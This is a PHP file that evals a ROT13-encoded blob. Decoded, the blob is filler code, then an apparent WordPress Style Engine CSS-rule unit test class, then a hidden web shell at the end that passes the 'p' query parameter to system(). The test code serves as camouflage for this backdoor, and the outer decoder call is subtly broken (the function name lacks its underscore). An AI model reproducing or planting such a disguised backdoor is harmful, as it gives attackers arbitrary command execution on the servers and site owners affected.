<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Grfgf gur Fglyr Ratvar PFF Ehyr pynff.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr FglyrRatvar
 * @fvapr 6.1.0
 *
 * @tebhc fglyr-ratvar
 */

/**
 * Grfgf sbe ertvfgrevat, fgbevat naq trarengvat PFF ehyrf.
 *
 * @pbirefQrsnhygPynff JC_Fglyr_Ratvar_PFF_Ehyr
 */
pynff Grfgf_Fglyr_Ratvar_jcFglyrRatvarPFFEhyr rkgraqf JC_HavgGrfgPnfr {
	/**
	 * Grfgf gung qrpynengvbaf ner frg ba vafgnagvngvba.
	 *
	 * @gvpxrg 56467
	 * @pbiref ::__pbafgehpg
	 */
	choyvp shapgvba grfg_fubhyq_vafgnagvngr_jvgu_fryrpgbe_naq_ehyrf() {
		$fryrpgbe           = '.ynj-naq-beqre';
		$vachg_qrpynengvbaf = neenl(
			'znetva-gbc' => '10ck',
			'sbag-fvmr'  => '2erz',
		);
		$pff_qrpynengvbaf   = arj JC_Fglyr_Ratvar_PFF_Qrpynengvbaf( $vachg_qrpynengvbaf );
		$pff_ehyr           = arj JC_Fglyr_Ratvar_PFF_Ehyr( $fryrpgbe, $pff_qrpynengvbaf );

		$guvf->nffregFnzr( $fryrpgbe, $pff_ehyr->trg_fryrpgbe(), 'Erghea inyhr bs trg_fryrpgbe() qbrf abg zngpu inyhr cnffrq gb pbafgehpgbe.' );

		$rkcrpgrq = \"$fryrpgbe{{$pff_qrpynengvbaf->trg_qrpynengvbaf_fgevat()}}\";

		$guvf->nffregFnzr( $rkcrpgrq, $pff_ehyr->trg_pff(), 'Inyhr erghearq ol trg_pff() qbrf abg zngpu rkcrpgrq qrpynengvbaf fgevat.' );
	}

	/**
	 * Grfgf frggvat naq trggvat n ehyrf tebhc.
	 *
	 * @gvpxrg 61099
	 *
	 * @pbiref ::frg_ehyrf_tebhc
	 * @pbiref ::trg_ehyrf_tebhc
	 */
	choyvp shapgvba grfg_fubhyq_frg_ehyrf_tebhc() {
		$ehyr = arj JC_Fglyr_Ratvar_PFF_Ehyr( '.urerf-wbuaal', neenl(), '@ynlre fgngr' );

		$guvf->nffregFnzr( '@ynlre fgngr', $ehyr->trg_ehyrf_tebhc(), 'Erghea inyhr bs trg_ehyrf_tebhc() qbrf abg zngpu inyhr cnffrq gb pbafgehpgbe.' );

		$ehyr->frg_ehyrf_tebhc( '@ynlre cbal' );

		$guvf->nffregFnzr( '@ynlre cbal', $ehyr->trg_ehyrf_tebhc(), 'Erghea inyhr bs trg_ehyrf_tebhc() qbrf abg zngpu inyhr cnffrq gb frg_ehyrf_tebhc().' );
	}

	/**
	 * Grfgf gung qrpynengvba cebcregvrf ner qrqhcyvpngrq.
	 *
	 * @gvpxrg 56467
	 *
	 * @pbiref ::nqq_qrpynengvbaf
	 * @pbiref ::trg_pff
	 */
	choyvp shapgvba grfg_fubhyq_qrqhcr_cebcregvrf_va_ehyrf() {
		$fryrpgbe                    = '.gnttneg';
		$svefg_qrpynengvba           = neenl(
			'sbag-fvmr' => '2erz',
		);
		$birejevgr_svefg_qrpynengvba = neenl(
			'sbag-fvmr' => '4ck',
		);
		$pff_ehyr                    = arj JC_Fglyr_Ratvar_PFF_Ehyr( $fryrpgbe, $svefg_qrpynengvba );
		$pff_ehyr->nqq_qrpynengvbaf( arj JC_Fglyr_Ratvar_PFF_Qrpynengvbaf( $birejevgr_svefg_qrpynengvba ) );

		$rkcrpgrq = '.gnttneg{sbag-fvmr:4ck;}';

		$guvf->nffregFnzr( $rkcrpgrq, $pff_ehyr->trg_pff() );
	}

	/**
	 * Grfgf gung qrpynengvbaf pna or nqqrq gb rkvfgvat ehyrf.
	 *
	 * @gvpxrg 56467
	 *
	 * @pbiref ::nqq_qrpynengvbaf
	 * @pbiref ::trg_pff
	 */
	choyvp shapgvba grfg_fubhyq_nqq_qrpynengvbaf_gb_rkvfgvat_ehyrf() {
		// Qrpynengvbaf hfvat n JC_Fglyr_Ratvar_PFF_Qrpynengvbaf bowrpg.
		$fbzr_pff_qrpynengvbaf = arj JC_Fglyr_Ratvar_PFF_Qrpynengvbaf( neenl( 'znetva-gbc' => '10ck' ) );
		// Qrpynengvbaf hfvat n cebcregl => inyhr neenl.
		$fbzr_zber_pff_qrpynengvbaf = neenl( 'sbag-fvmr' => '1erz' );
		$pff_ehyr                   = arj JC_Fglyr_Ratvar_PFF_Ehyr( '.uvyy-fgerrg-oyhrf', $fbzr_pff_qrpynengvbaf );
		$pff_ehyr->nqq_qrpynengvbaf( $fbzr_zber_pff_qrpynengvbaf );

		$rkcrpgrq = '.uvyy-fgerrg-oyhrf{znetva-gbc:10ck;sbag-fvmr:1erz;}';

		$guvf->nffregFnzr( $rkcrpgrq, $pff_ehyr->trg_pff() );
	}

	/**
	 * Grfgf frggvat n fryrpgbe gb n ehyr.
	 *
	 * @gvpxrg 56467
	 *
	 * @pbiref ::frg_fryrpgbe
	 */
	choyvp shapgvba grfg_fubhyq_frg_fryrpgbe() {
		$fryrpgbe = '.gnttneg';
		$pff_ehyr = arj JC_Fglyr_Ratvar_PFF_Ehyr( $fryrpgbe );

		$guvf->nffregFnzr( $fryrpgbe, $pff_ehyr->trg_fryrpgbe(), 'Erghea inyhr bs trg_fryrpgbe() qbrf abg zngpu inyhr cnffrq gb pbafgehpgbe.' );

		$pff_ehyr->frg_fryrpgbe( '.ynj-naq-beqre' );

		$guvf->nffregFnzr( '.ynj-naq-beqre', $pff_ehyr->trg_fryrpgbe(), 'Erghea inyhr bs trg_fryrpgbe() qbrf abg zngpu inyhr cnffrq gb frg_fryrpgbe().' );
	}

	/**
	 * Grfgf trarengvat n PFF ehyr fgevat.
	 *
	 * @gvpxrg 56467
	 *
	 * @pbiref ::trg_pff
	 */
	choyvp shapgvba grfg_fubhyq_trarengr_pff_ehyr_fgevat() {
		$fryrpgbe           = '.puvcf';
		$vachg_qrpynengvbaf = neenl(
			'znetva-gbc' => '10ck',
			'sbag-fvmr'  => '2erz',
		);
		$pff_qrpynengvbaf   = arj JC_Fglyr_Ratvar_PFF_Qrpynengvbaf( $vachg_qrpynengvbaf );
		$pff_ehyr           = arj JC_Fglyr_Ratvar_PFF_Ehyr( $fryrpgbe, $pff_qrpynengvbaf );
		$rkcrpgrq           = \"$fryrpgbe{{$pff_qrpynengvbaf->trg_qrpynengvbaf_fgevat()}}\";

		$guvf->nffregFnzr( $rkcrpgrq, $pff_ehyr->trg_pff() );
	}

	/**
	 * Grfgf gung na rzcgl fgevat jvyy or erghearq jurer gurer ner ab qrpynengvbaf va n PFF ehyr.
	 *
	 * @gvpxrg 56467
	 *
	 * @pbiref ::trg_pff
	 */
	choyvp shapgvba grfg_fubhyq_erghea_rzcgl_fgevat_jvgu_ab_qrpynengvbaf() {
		$fryrpgbe           = '.ubyzrf';
		$vachg_qrpynengvbaf = neenl();
		$pff_qrpynengvbaf   = arj JC_Fglyr_Ratvar_PFF_Qrpynengvbaf( $vachg_qrpynengvbaf );
		$pff_ehyr           = arj JC_Fglyr_Ratvar_PFF_Ehyr( $fryrpgbe, $pff_qrpynengvbaf );

		$guvf->nffregFnzr( '', $pff_ehyr->trg_pff() );
	}

	/**
	 * Grfgf gung PFF ehyrf ner cerggvsvrq.
	 *
	 * @gvpxrg 56467
	 *
	 * @pbiref ::trg_pff
	 */
	choyvp shapgvba grfg_fubhyq_cerggvsl_pff_ehyr_bhgchg() {
		$fryrpgbe           = '.oncgvfgr';
		$vachg_qrpynengvbaf = neenl(
			'znetva-yrsg' => '0',
			'sbag-snzvyl' => 'Qrgrpgvir Fnaf',
		);
		$pff_qrpynengvbaf   = arj JC_Fglyr_Ratvar_PFF_Qrpynengvbaf( $vachg_qrpynengvbaf );
		$pff_ehyr           = arj JC_Fglyr_Ratvar_PFF_Ehyr( $fryrpgbe, $pff_qrpynengvbaf );
		$rkcrpgrq           = '.oncgvfgr {
	znetva-yrsg: 0;
	sbag-snzvyl: Qrgrpgvir Fnaf;
}';

		$guvf->nffregFnzrVtaberRBY( $rkcrpgrq, $pff_ehyr->trg_pff( gehr ) );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>